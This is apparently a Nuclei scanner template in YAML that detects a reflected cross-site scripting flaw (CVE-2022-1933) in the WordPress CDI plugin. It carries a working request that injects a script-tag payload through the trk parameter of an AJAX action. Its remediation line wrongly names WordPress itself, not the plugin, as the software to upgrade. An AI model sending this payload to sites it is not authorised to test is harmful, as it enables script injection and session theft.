http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <script>alert(document.domain)</script>
    - Tracking code not correct
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-admin/admin-ajax.php?action=cdi_collect_follow&trk=%3Cscript%3Ealert(document.domain)%3C/script%3E'
id: CVE-2022-1933
info:
  author: Akincibor
  classification:
    cpe: cpe:2.3:a:collect_and_deliver_interface_for_woocommerce_project:collect_and_deliver_interface_for_woocommerce:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2022-1933
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.94203
    epss-score: 0.14451
  description: 'WordPress CDI plugin prior to 5.1.9 contains a cross-site scripting
    vulnerability. The plugin does not sanitize and escape a parameter before outputting
    it back in the response of an AJAX action. An attacker can inject arbitrary script
    in the browser of an unsuspecting user in the context of the affected site. This
    can allow the attacker to steal cookie-based authentication credentials and launch
    other attacks.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to potential data theft or unauthorized actions.

    '
  metadata:
    framework: wordpress
    max-request: 1
    product: collect_and_deliver_interface_for_woocommerce
    vendor: collect_and_deliver_interface_for_woocommerce_project
    verified: true
  name: WordPress CDI <5.1.9 - Cross Site Scripting
  reference:
  - https://wpscan.com/vulnerability/6cedb27f-6140-4cba-836f-63de98e521bf
  - https://wordpress.org/plugins/collect-and-deliver-interface-for-woocommerce/advanced/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-1933
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Upgrade WordPress to version 5.1.9 or later to mitigate this vulnerability.

    '
  severity: medium
  tags: cve,cve2022,cdi,wpscan,wp-plugin,wp,wordpress,xss,collect_and_deliver_interface_for_woocommerce_project,vuln
